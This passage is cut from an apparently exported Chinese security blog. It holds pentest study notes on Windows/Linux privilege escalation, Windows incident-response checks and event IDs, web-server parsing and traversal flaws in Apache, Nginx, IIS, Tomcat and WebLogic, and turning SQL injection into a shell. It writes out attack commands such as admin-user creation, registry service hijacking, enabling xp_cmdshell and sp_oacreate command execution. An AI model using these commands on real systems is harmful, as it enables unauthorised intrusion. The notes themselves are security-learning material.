title=\"信息收集\"></a>信息收集</h2><p>查看主机名</p>\n<p>hostname</p>\n<p>查看用户名</p>\n<p>whoami</p>\n<p>查看用户名对应属组</p>\n<p>window:net user 用户名</p>\n<p>linux:groups 用户名</p>\n<p>添加用户</p>\n<p>window:net user username password /add</p>\n<p>linux:useradd -m -s  用户名 passwd 用户名</p>\n<p>将用户加入管理组</p>\n<p>window:net localgroup administrators username /add</p>\n<p>linux:usermod -a -G 用户组 用户名</p>\n<p>系统信息</p>\n<p>window: systeminfo(详细补丁信息wmic qfe list)</p>\n<p>linxu: uname -a查看内核版本</p>\n<p>查看域中计算机列表</p>\n<p>net view</p>\n<p><strong><a href=\"https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247484666&idx=1&sn=4ce455c0144c7b1474625f541a868876&chksm=ec1e34d2db69bdc49bb4cd22b47e1f1dbb02e95dfaab7d0aa63f8e44838f00fd53af0b215cb9&scene=21#wechat_redirect\" target=\"_blank\" rel=\"noopener\">window下主机信息收集命令</a></strong></p>\n<h2 id=\"提权分类\"><a href=\"#提权分类\" class=\"headerlink\" title=\"提权分类\"></a>提权分类</h2><h3 id=\"window\"><a href=\"#window\" class=\"headerlink\" title=\"window\"></a>window</h3><h3 id=\"不带引号的服务路径\"><a href=\"#不带引号的服务路径\" class=\"headerlink\" title=\"不带引号的服务路径\"></a>不带引号的服务路径</h3><p>使用c:\\a n\\1.exe来执行程序时是执行的c:\\a。</p>\n<p><img src=\"/2019/10/15/提权/1571234782646.png\" alt=\"1571234782646\"></p>\n<p>也就是说我们只要对这种目录具有w权限便能上传恶意exe让系统服务来执行提权,这是一种劫持型的攻击。</p>\n<p>检测命令:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"错误的服务权限\"><a href=\"#错误的服务权限\" class=\"headerlink\" title=\"错误的服务权限\"></a>错误的服务权限</h3><p>由于用户可能对某些服务拥有过高权限导致的提权，如升级程序等，用户对升级程序存在写权限就可以替换该程序提权。和服务路径提权一样，也是一种劫持型攻击。可以使用微软官方程序accesschk.exe检查</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">accesschk.exe -uwcqv &quot;用户名 * /accepteula//列出可被用户名修改的服务</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"注册表权限错误\"><a href=\"#注册表权限错误\" class=\"headerlink\" title=\"注册表权限错误\"></a>注册表权限错误</h3><p>通过修改注册表改变服务执行路径导致系统以system执行我们上传的exe文件，下载<a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=23510\" target=\"_blank\" rel=\"noopener\">subinacl工具</a>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找易受攻击服务列表</span><br><span class=\"line\">subinacl.exe /keyreg &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Service&quot; /display</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">执行攻击代码</span><br><span class=\"line\">reg add &quot;服务注册表路径&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;攻击程序&quot; /f</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"不安全的文件系统权限\"><a href=\"#不安全的文件系统权限\" class=\"headerlink\" title=\"不安全的文件系统权限\"></a>不安全的文件系统权限</h3><p>管理员可能配置某个服务的目录为所有人完全控制之类的，通过替换exe文件来提权。</p>\n<h3 id=\"AlwaysInstallElevated\"><a href=\"#AlwaysInstallElevated\" class=\"headerlink\" title=\"AlwaysInstallElevated\"></a>AlwaysInstallElevated</h3><p>AlwaysInstallElevated是一个策略设置，允许任意用户以system权限运行MSI文件，可导致提权。默认关闭。</p>\n<h3 id=\"密钥凭证窃取\"><a href=\"#密钥凭证窃取\" class=\"headerlink\" title=\"密钥凭证窃取\"></a>密钥凭证窃取</h3><p>当服务器的安全配置做的很好的时候就尝试在服务器中翻找password等关键字段。</p>\n<h3 id=\"文件系统权限配置不当提权\"><a href=\"#文件系统权限配置不当提权\" class=\"headerlink\" title=\"文件系统权限配置不当提权\"></a>文件系统权限配置不当提权</h3><p>suid和sgid是当执行文件时使用文件属主和属组的权限，目录的S属性使得在该目录下创建的任何文件及目录属于该目录所拥有的组。错误的配置文件目录可以通过这样的配置来提高权限</p>\n<h2 id=\"系统漏洞提权\"><a href=\"#系统漏洞提权\" class=\"headerlink\" title=\"系统漏洞提权\"></a>系统漏洞提权</h2><p>系统漏洞检测脚本：<a href=\"https://github.com/mzet-/linux-exploit-suggester\" target=\"_blank\" rel=\"noopener\">linux</a>和<a href=\"https://github.com/AonCyberLabs/Windows-Exploit-Suggester\" target=\"_blank\" rel=\"noopener\">window</a>通过工具、人工寻找可能存在的漏洞使用exp提权</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://blog.csdn.net/Fly_hps/article/details/80301264\" target=\"_blank\" rel=\"noopener\">window提权教程</a></p>\n","categories":[],"tags":[]},{"title":"windows应急","url":"http://yoursite.com/2019/09/29/windows应急/","content":"<h1 id=\"window应急响应\"><a href=\"#window应急响应\" class=\"headerlink\" title=\"window应急响应\"></a>window应急响应</h1><p>应急响应是安全的一个非常重要的点，应急响应是为了在事故发生之后降低损失，排查攻击路径以方便修复以防被再次攻击，甚至追踪到攻击者追责。</p>\n<p><img src=\"/2019/09/29/windows应急/1575008385511.png\" alt=\"1575008385511\"></p>\n<h2 id=\"基础排查\"><a href=\"#基础排查\" class=\"headerlink\" title=\"基础排查\"></a>基础排查</h2><h3 id=\"账号排查\"><a href=\"#账号排查\" class=\"headerlink\" title=\"账号排查\"></a>账号排查</h3><p><strong>弱口令排查</strong></p>\n<p>询问是否存在弱口令</p>\n<p><strong>账号排查</strong></p>\n<p>检查是否存在未知的账号</p>\n<p>命令输入lusrmgr.msc打开账户组情况</p>\n<p><strong>检查隐藏账号</strong></p>\n<p>HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\注册表系统账号排查</p>\n<p><strong>登录日志</strong></p>\n<p>eventvwr.msc查看事件</p>\n<h3 id=\"异常端口\"><a href=\"#异常端口\" class=\"headerlink\" title=\"异常端口\"></a>异常端口</h3><p>netstat -ano排查端口查看端口是否有连接一些异常的IP</p>\n<p>tasklist  | findstr “PID”查看开启连接的文件</p>\n<p>taskkill /f /pid 进程id 杀死进程</p>\n<h3 id=\"进程检查\"><a href=\"#进程检查\" class=\"headerlink\" title=\"进程检查\"></a>进程检查</h3><p>命令行打开msinfo32，检查意外中的进程。</p>\n<h3 id=\"检查启动项\"><a href=\"#检查启动项\" class=\"headerlink\" title=\"检查启动项\"></a>检查启动项</h3><p>任务管理器-启动 检查启动项是否存在病毒等</p>\n<h3 id=\"检查计划任务\"><a href=\"#检查计划任务\" class=\"headerlink\" title=\"检查计划任务\"></a>检查计划任务</h3><p>控制面板-计划任务</p>\n<h3 id=\"检查服务器自启动\"><a href=\"#检查服务器自启动\" class=\"headerlink\" title=\"检查服务器自启动\"></a>检查服务器自启动</h3><p>services.msc检查服务</p>\n<h3 id=\"检查补丁\"><a href=\"#检查补丁\" class=\"headerlink\" title=\"检查补丁\"></a>检查补丁</h3><p>systeminfo查看补丁情况</p>\n<h3 id=\"webshell和病毒查杀\"><a href=\"#webshell和病毒查杀\" class=\"headerlink\" title=\"webshell和病毒查杀\"></a>webshell和病毒查杀</h3><p>使用安全工具对木马和病毒查杀</p>\n<h2 id=\"日志\"><a href=\"#日志\" class=\"headerlink\" title=\"日志\"></a>日志</h2><p>windows日志分为应用程序日志、系统日志和安全日志，系统和应用程序日志主要是故障信息，安全人员主要审计安全日志，通过安全日志可以看到攻击者何时连上和连上后的行为。</p>\n<p>eventvwr.msc打开日志。</p>\n<h3 id=\"安全日志审计\"><a href=\"#安全日志审计\" class=\"headerlink\" title=\"安全日志审计\"></a>安全日志审计</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">日志存放目录</span><br><span class=\"line\">%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"常见事件ID与对应事件\"><a href=\"#常见事件ID与对应事件\" class=\"headerlink\" title=\"常见事件ID与对应事件\"></a>常见事件ID与对应事件</h3><table>\n<thead>\n<tr>\n<th align=\"left\">事件ID</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">4672</td>\n<td align=\"left\">使用超级用户（如管理员）进行登录</td>\n</tr>\n<tr>\n<td align=\"left\">1102</td>\n<td align=\"left\">清理审计日志</td>\n</tr>\n<tr>\n<td align=\"left\">4624</td>\n<td align=\"left\">账号成功登录</td>\n</tr>\n<tr>\n<td align=\"left\">4625</td>\n<td align=\"left\">账号登录失败</td>\n</tr>\n<tr>\n<td align=\"left\">4768</td>\n<td align=\"left\">Kerberos身份验证（TGT请求）</td>\n</tr>\n<tr>\n<td align=\"left\">4769</td>\n<td align=\"left\">Kerberos服务票证请求</td>\n</tr>\n<tr>\n<td align=\"left\">4776</td>\n<td align=\"left\">NTLM身份验证</td>\n</tr>\n<tr>\n<td align=\"left\">4672</td>\n<td align=\"left\">授予特殊权限</td>\n</tr>\n<tr>\n<td align=\"left\">4720</td>\n<td align=\"left\">创建用户</td>\n</tr>\n<tr>\n<td align=\"left\">4726</td>\n<td align=\"left\">删除用户</td>\n</tr>\n<tr>\n<td align=\"left\">4728</td>\n<td align=\"left\">将成员添加到启用安全的全局组中</td>\n</tr>\n<tr>\n<td align=\"left\">4729</td>\n<td align=\"left\">将成员从安全的全局组中移除</td>\n</tr>\n<tr>\n<td align=\"left\">4732</td>\n<td align=\"left\">将成员添加到启用安全的本地组中</td>\n</tr>\n<tr>\n<td align=\"left\">4733</td>\n<td align=\"left\">将成员从启用安全的本地组中移除</td>\n</tr>\n<tr>\n<td align=\"left\">4756</td>\n<td align=\"left\">将成员添加到启用安全的通用组中</td>\n</tr>\n<tr>\n<td align=\"left\">4757</td>\n<td align=\"left\">将成员从启用安全的通用组中移除</td>\n</tr>\n<tr>\n<td align=\"left\">4719</td>\n<td align=\"left\">系统审计策略修改</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th>登录类型</th>\n<th>描述</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>2</td>\n<td>交互式登录（Interactive）</td>\n<td>用户在本地进行登录。</td>\n</tr>\n<tr>\n<td>3</td>\n<td>网络（Network）</td>\n<td>最常见的情况就是连接到共享文件夹或共享打印机时。</td>\n</tr>\n<tr>\n<td>4</td>\n<td>批处理（Batch）</td>\n<td>通常表明某计划任务启动。</td>\n</tr>\n<tr>\n<td>5</td>\n<td>服务（Service）</td>\n<td>每种服务都被配置在某个特定的用户账号下运行。</td>\n</tr>\n<tr>\n<td>7</td>\n<td>解锁（Unlock）</td>\n<td>屏保解锁。</td>\n</tr>\n<tr>\n<td>8</td>\n<td>网络明文（NetworkCleartext）</td>\n<td>登录的密码在网络上是通过明文传输的，如FTP。</td>\n</tr>\n<tr>\n<td>9</td>\n<td>新凭证（NewCredentials）</td>\n<td>使用带/Netonly参数的RUNAS命令运行一个程序。</td>\n</tr>\n<tr>\n<td>10</td>\n<td>远程交互，（RemoteInteractive）</td>\n<td>通过终端服务、远程桌面或远程协助访问计算机。</td>\n</tr>\n<tr>\n<td>11</td>\n<td>缓存交互（CachedInteractive）</td>\n<td>以一个域用户登录而又没有域控制器可用</td>\n</tr>\n</tbody></table>\n","categories":[],"tags":[]},{"title":"web容器漏洞","url":"http://yoursite.com/2019/09/23/web容器漏洞/","content":"<h1 id=\"常见容器的区别与介绍\"><a href=\"#常见容器的区别与介绍\" class=\"headerlink\" title=\"常见容器的区别与介绍\"></a>常见容器的区别与介绍</h1><p>我们经常听说<strong>web服务器</strong>，<strong>http服务器</strong>，<strong>应用服务器</strong>。<strong>Web服务器</strong>是指在Internet上的计算机程序，因为Web服务器主要支持的协议就是HTTP协议，通常情况下我们说的WEB服务器和HTTP服务器说的是同一回事，<strong>应用服务器</strong>是用于处理一些动态数据，处理脚本文件的。<strong>Apache</strong>和<strong>Nginx</strong>是纯粹的<strong>Web服务器</strong>，而<strong>IIS</strong>和<strong>Tomcat</strong>因为具有了解释和执行服务器端代码的能力，可以称作为<strong>轻量级应用服务器</strong>。</p>\n<p>这篇文章会整理一些常见安全问题而非所有。</p>\n<h2 id=\"Apache服务器\"><a href=\"#Apache服务器\" class=\"headerlink\" title=\"Apache服务器\"></a>Apache服务器</h2><h3 id=\"默认配置的问题\"><a href=\"#默认配置的问题\" class=\"headerlink\" title=\"默认配置的问题\"></a>默认配置的问题</h3><p>1.windows下默认安装是administrator,liunx是www-data,因为linux运行1024前的端口需要root权限所以apache的主进程是root(这里应该是一个提权的点，以后研究)。</p>\n<p>2.linux下如果删除默认文件index.html的话在默认配置下访问根目录会列出目录下的文件。</p>\n<h3 id=\"解析漏洞\"><a href=\"#解析漏洞\" class=\"headerlink\" title=\"解析漏洞\"></a>解析漏洞</h3><p>解析漏洞老生长谈了，无非是Apache遇到无法识别的1.php.aa的后缀会向前解析。</p>\n<p>看了一篇文章<a href=\"http://www.cnblogs.com/milantgh/p/5116955.html他这里描述了，使用module模式与php结合的所有版本\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/milantgh/p/5116955.html他这里描述了，使用module模式与php结合的所有版本</a> apache存在未知扩展名解析漏洞，使用fastcgi模式与php结合的所有版本apache不存在此漏洞。</p>\n<p>module、cgi、fastcgi的区别可以参考<a href=\"https://blog.csdn.net/lamp_yang_3533/article/details/53002731\" target=\"_blank\" rel=\"noopener\">文章</a>。</p>\n<h3 id=\"换行解析漏洞\"><a href=\"#换行解析漏洞\" class=\"headerlink\" title=\"换行解析漏洞\"></a>换行解析漏洞</h3><p><strong>影响版本：</strong>Apache2.4.0~2.4.29</p>\n<p>参考cve-2017-15715</p>\n<p>在Apache2.4.0~2.4.29上传1.php%0a会存在解析漏洞。</p>\n<p><img src=\"/2019/09/23/web容器漏洞/1569228467146.png\" alt=\"1569228467146\"></p>\n<p>获取文件名时不能用<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>，因为他会自动把换行去掉。</p>\n<p>php后缀php、php3、php4、php5、phpt、phtml，phtml是ZendFramework模板的，正常情况不会解析。</p>\n<h3 id=\"htaccess文件上传\"><a href=\"#htaccess文件上传\" class=\"headerlink\" title=\".htaccess文件上传\"></a>.htaccess文件上传</h3><p><strong>影响版本：</strong>所有</p>\n<p>自己实验一直没成功，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;shell&quot;&gt;</span><br><span class=\"line\">SetHandler application/x-httpd-php</span><br><span class=\"line\">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后配置了shell.php都不能解析。</p>\n<h2 id=\"Nginx服务器\"><a href=\"#Nginx服务器\" class=\"headerlink\" title=\"Nginx服务器\"></a>Nginx服务器</h2><h3 id=\"用户配置错误解析漏洞\"><a href=\"#用户配置错误解析漏洞\" class=\"headerlink\" title=\"用户配置错误解析漏洞\"></a>用户配置错误解析漏洞</h3><p><strong>影响版本：</strong>所有</p>\n<p>这是php的配置问题cgi.fix_pathinfo默认为1导致存在解析漏洞，nginx看到1.jpg/.php结尾就发给就发给了php，php没有找到该文件就会进行补全删掉该后缀解析了1.jpg中的内容。这漏洞存在于所有版本。</p>\n<h3 id=\"解析漏洞-CVE-2013-4547\"><a href=\"#解析漏洞-CVE-2013-4547\" class=\"headerlink\" title=\"解析漏洞(CVE-2013-4547)\"></a>解析漏洞(CVE-2013-4547)</h3><p><strong>影响版本：</strong>Nginx 0.8.41<del>1.4.3 / 1.5.0</del>1.5.7</p>\n<p><a href=\"https://www.cnblogs.com/bmjoker/p/9838600.html\" target=\"_blank\" rel=\"noopener\">文章</a>可以参考，1.gif[0x20]的文件，然后访问1.gif[0x20][0x00].php的文件gif会被当做php解析</p>\n<h3 id=\"空字节解析漏洞\"><a href=\"#空字节解析漏洞\" class=\"headerlink\" title=\"空字节解析漏洞\"></a>空字节解析漏洞</h3><p><strong>版本:</strong>0.5.<em>,0.6.</em>, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37</p>\n<p>Nginx在图片中嵌入PHP代码然后通过访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxx.jpg%00.php</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"nginx越界读取缓存漏洞CVE-2017-7529\"><a href=\"#nginx越界读取缓存漏洞CVE-2017-7529\" class=\"headerlink\" title=\"nginx越界读取缓存漏洞CVE-2017-7529\"></a>nginx越界读取缓存漏洞CVE-2017-7529</h3><p><strong>影响版本：</strong>Nginx version 0.5.6 - 1.13.2</p>\n<p><a href=\"https://github.com/vulhub/vulhub/blob/master/nginx/CVE-2017-7529/poc.py\" target=\"_blank\" rel=\"noopener\">poc</a>这个漏洞就是整数溢出漏洞的利用，能够从Cache文件中获取Cache头的信息。在某些配置的情况下Cache头中会存在IP地址信息，造成信息泄露绕过waf等。</p>\n<h3 id=\"目录穿越漏洞\"><a href=\"#目录穿越漏洞\" class=\"headerlink\" title=\"目录穿越漏洞\"></a>目录穿越漏洞</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /files &#123;</span><br><span class=\"line\">    alias /home/;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样的配置形式会导致任意文件读取，<a href=\"https://ip/files../../etc/password，修复files后加上/。\" target=\"_blank\" rel=\"noopener\">https://ip/files../../etc/password，修复files后加上/。</a></p>\n<h3 id=\"CRLF注入\"><a href=\"#CRLF注入\" class=\"headerlink\" title=\"CRLF注入\"></a>CRLF注入</h3><p>当url/test%0a%0dSet-Cookie：hello被设置在http返回包时CRLF将会换行设置cookie，这样可以用来钓鱼之类的攻击</p>\n<h2 id=\"IIS\"><a href=\"#IIS\" class=\"headerlink\" title=\"IIS\"></a>IIS</h2><h3 id=\"文件名解析漏洞\"><a href=\"#文件名解析漏洞\" class=\"headerlink\" title=\"文件名解析漏洞\"></a>文件名解析漏洞</h3><p><strong>版本:</strong>IIS6.0/5.*</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">目录解析:/xx.asp/xx.jpg</span><br><span class=\"line\">文件解析:sp.asp;.jpg</span><br></pre></td></tr></table></figure>\n\n<p>在IIS6.0下，分号后面的不被解析，也就是说1.asp;.jpg=1.asp</p>\n<h3 id=\"IIS-7-0-IIS-7-5用户配置错误解析漏洞\"><a href=\"#IIS-7-0-IIS-7-5用户配置错误解析漏洞\" class=\"headerlink\" title=\"IIS 7.0/IIS 7.5用户配置错误解析漏洞\"></a>IIS 7.0/IIS 7.5用户配置错误解析漏洞</h3><p>同nginx一样</p>\n<h3 id=\"PUT方法上传\"><a href=\"#PUT方法上传\" class=\"headerlink\" title=\"PUT方法上传\"></a>PUT方法上传</h3><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p>\n<h3 id=\"短文件名漏洞\"><a href=\"#短文件名漏洞\" class=\"headerlink\" title=\"短文件名漏洞\"></a>短文件名漏洞</h3><p><strong>版本:</strong></p>\n<blockquote>\n<p>IIS 1.0，Windows NT 3.51<br>IIS 3.0，Windows NT 4.0 Service Pack 2<br>IIS 4.0，Windows NT 4.0选项包<br>IIS 5.0，Windows 2000<br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition<br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition<br>IIS 7.0，Windows Server 2008和Windows Vista<br>IIS 7.5，Windows 7（远程启用<customerrors>或没有web.config）</customerrors></p>\n<p>IIS 8.0、IIS 8.5和IIS 10.0的短文件名称均可以通过OPTIONS和TRACE方法被猜测成功。</p>\n<p>IIS 7.5，Windows 2008（经典管道模式）        </p>\n<p>注意：IIS使用.Net Framework 4时不受影响</p>\n</blockquote>\n<p><u><a href=\"http://ip/a*~1****/a.aspx\" target=\"_blank\" rel=\"noopener\">http://ip/a*~1****/a.aspx</a></u>文件名首字母为a的文件存在返回400</p>\n<p><u><a href=\"http://ip/ab*~1****/a.aspx\" target=\"_blank\" rel=\"noopener\">http://ip/ab*~1****/a.aspx</a></u>文件名首字母为ab的文件存在返回400</p>\n<p>依次猜解获得短文件名。<a href=\"http://www.lijiejie.com/iis-win8-3-shortname-brute/\" target=\"_blank\" rel=\"noopener\">教程</a></p>\n<h2 id=\"tomcat\"><a href=\"#tomcat\" class=\"headerlink\" title=\"tomcat\"></a>tomcat</h2><h3 id=\"tomcat弱口令远程部署后门文件\"><a href=\"#tomcat弱口令远程部署后门文件\" class=\"headerlink\" title=\"tomcat弱口令远程部署后门文件\"></a>tomcat弱口令远程部署后门文件</h3><p><a href=\"http://ip/manager/html是tomcat部署的地址，对于一些网站可能存在弱口令，攻击者通过远程部署上传后门\" target=\"_blank\" rel=\"noopener\">http://ip/manager/html是tomcat部署的地址，对于一些网站可能存在弱口令，攻击者通过远程部署上传后门</a></p>\n<h2 id=\"JBOSS\"><a href=\"#JBOSS\" class=\"headerlink\" title=\"JBOSS\"></a>JBOSS</h2><h3 id=\"JBOSS远程部署获取服务器权限\"><a href=\"#JBOSS远程部署获取服务器权限\" class=\"headerlink\" title=\"JBOSS远程部署获取服务器权限\"></a>JBOSS远程部署获取服务器权限</h3><p><a href=\"http://localhost:8080/jmx-console/\" target=\"_blank\" rel=\"noopener\">http://localhost:8080/jmx-console/</a>, jboss和tomcat都可以远程部署，如果存在弱口令可以获取webshell</p>\n<p><a href=\"https://blog.csdn.net/weixin_42936566/article/details/86841666\" target=\"_blank\" rel=\"noopener\">参考资料</a></p>\n<h2 id=\"WebLogic\"><a href=\"#WebLogic\" class=\"headerlink\" title=\"WebLogic\"></a>WebLogic</h2><h3 id=\"WebLogic远程部署\"><a href=\"#WebLogic远程部署\" class=\"headerlink\" title=\"WebLogic远程部署\"></a>WebLogic远程部署</h3><p><a href=\"http://ip/console部署war\" target=\"_blank\" rel=\"noopener\">http://ip/console部署war</a></p>\n<h3 id=\"任意文件上传\"><a href=\"#任意文件上传\" class=\"headerlink\" title=\"任意文件上传\"></a>任意文件上传</h3><p>版本：10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3</p>\n<p>非常神奇难以理解的漏洞，直接开放未授权便可上传的页面</p>\n<p>访问<a href=\"http://127.0.0.1:7001/ws_utc/config.do，http://127.0.0.1:7001/ws_utc/begin.do可直接上传。\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1:7001/ws_utc/config.do，http://127.0.0.1:7001/ws_utc/begin.do可直接上传。</a></p>\n<h3 id=\"weblogic一把梭\"><a href=\"#weblogic一把梭\" class=\"headerlink\" title=\"weblogic一把梭\"></a>weblogic一把梭</h3><p><a href=\"https://github.com/rabbitmask/WeblogicScan\" target=\"_blank\" rel=\"noopener\">工具</a></p>\n","categories":[],"tags":[]},{"title":"sql屠龙术","url":"http://yoursite.com/2019/08/29/sql注入获得shell/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。</p>\n<p>当然作为新手我总结的方式肯定不全面，在以后的学习工作中我遇到新的方式会添加进来。</p>\n<h1 id=\"MySql\"><a href=\"#MySql\" class=\"headerlink\" title=\"MySql\"></a>MySql</h1><h2 id=\"权限\"><a href=\"#权限\" class=\"headerlink\" title=\"权限\"></a>权限</h2><p>mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。</p>\n<p>表权限:’Select’, ‘Insert’, ‘Update’, ‘Delete’, ‘Create’, ‘Drop’, ‘Grant’, ‘References’, ‘Index’, ‘Alter’;</p>\n<p>列权限:’Select’, ‘Insert’, ‘Update’, ‘References’;</p>\n<p>过程权限:’Execute’, ‘Alter Routine’, ‘Grant’;</p>\n<p>表和列权限不用多说，过程权限指的是存储过程的权限，存储过程可以理解为编程语言的函数。</p>\n<h2 id=\"getshell方法总结\"><a href=\"#getshell方法总结\" class=\"headerlink\" title=\"getshell方法总结\"></a>getshell方法总结</h2><h3 id=\"select-…-into-outfile方法\"><a href=\"#select-…-into-outfile方法\" class=\"headerlink\" title=\"select … into outfile方法\"></a>select … into outfile方法</h3><p><strong>条件</strong></p>\n<p>数据库对对web目录有写权限。</p>\n<p>GPC关闭。</p>\n<p>有绝对路径。</p>\n<p>没有配置secure-file-priv。</p>\n<p><strong>实现步骤及原理</strong></p>\n<p>数据库是一个软件，软件的权限决定于启动者，启动者的系统权限高数据库的权限就高(这也不一定，oracle有自己创建的系统账号我暂时没研究过oracle这种执行一个命令使用的是什么账号的权限)，以下做一个验证。</p>\n<p><img src=\"/2019/08/29/sql注入获得shell/1567151247852.png\" alt=\"1567151247852\"></p>\n<p>上图是我使用非root运行数据库后使用apt-get，下图是我使用root启动再使用apt-get。</p>\n<p><img src=\"/2019/08/29/sql注入获得shell/1567151261135.png\" alt=\"1567151261135\"></p>\n<p>可以验证刚才的说法。</p>\n<p>secure-file-priv是mysql的一个限制导入导出的参数为NULL禁止导入、导出，值为目录为导入导出的路径，为空则不限制导入导出。</p>\n<p>union或者堆查询</p>\n<p><code>select &#39;内容&#39; into outfile &#39;路径&#39;;</code></p>\n<p>如果不能union可以使用</p>\n<p><code>into outfile &#39;路径&#39; fields terminated by &#39;代码&#39;;</code>terminated by是将后面的代码当分隔符插入进去</p>\n<h3 id=\"日志获得shell\"><a href=\"#日志获得shell\" class=\"headerlink\" title=\"日志获得shell\"></a>日志获得shell</h3><p>以general_log为例子。</p>\n<p><strong>条件</strong></p>\n<p>对web目录有写权限</p>\n<p>GPC关闭(GPC:是否对单引号转义)</p>\n<p>有绝对路径(读文件可以不用，写文件需要)</p>\n<p>需要能执行多行SQL语句</p>\n<p><strong>实现步骤及原理</strong></p>\n<p>show global variables like “%genera%”;查看开启的情况。</p>\n<p>set global general_log = on;打开general_log功能。</p>\n<p>set global general_log_file = ‘路径’;设置记录存储路径。</p>\n<p>select ‘代码’;写入代码。</p>\n<p><strong>mysql中慢查询日志也可以使用此方法来写入shell，错误日志与二进制日志目录都是需要修改mysql配置文件实现意义较低慢查询可以参考如下</strong><a href=\"https://www.cnblogs.com/c1e4r/articles/8902444.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/c1e4r/articles/8902444.html</a></p>\n<h2 id=\"防御方法\"><a href=\"#防御方法\" class=\"headerlink\" title=\"防御方法\"></a>防御方法</h2><p>secure_file_prive = null。</p>\n<p>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload 目录不授予执行权限。</p>\n<h1 id=\"SqlServer\"><a href=\"#SqlServer\" class=\"headerlink\" title=\"SqlServer\"></a>SqlServer</h1><h2 id=\"执行命令\"><a href=\"#执行命令\" class=\"headerlink\" title=\"执行命令\"></a>执行命令</h2><h3 id=\"xp-cmdshell\"><a href=\"#xp-cmdshell\" class=\"headerlink\" title=\"xp_cmdshell\"></a>xp_cmdshell</h3><p>xp_cmdshell是mssql的存储过程，可以直接执行命令。</p>\n<p><code>EXEC master.dbo.xp_cmdshell &#39;cmd&#39;;</code></p>\n<p><strong>mssql2005版本默认禁止。</strong></p>\n<p>激活xp_cmdshell。</p>\n<p><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></p>\n<p>安装xp_cmdshell。</p>\n<p><code>EXEC sp_addextendedproc xp_cmdshell,@dllname =&#39;xplog70.dll&#39;declare @o int</code></p>\n<p><code>sp_addextendedproc &#39;xp_cmdshell&#39;,&#39;xpsql70.dll&#39;</code></p>\n<h3 id=\"SP-OACREATE\"><a href=\"#SP-OACREATE\" class=\"headerlink\" title=\"SP_OACREATE\"></a>SP_OACREATE</h3><p><strong>MSSQL 2005及以上版本中默认是禁用的</strong></p>\n<p>写入shell</p>\n<p><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\\windows\\system32\\cmd.exe /c whoami &gt;d:\\\\temp\\\\1.txt&#39;</code></p>\n<p>该方式无回显，使用外带或写在文件中。</p>\n<p>激活sp_oacreate。</p>\n<p><code>exec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ole Automation 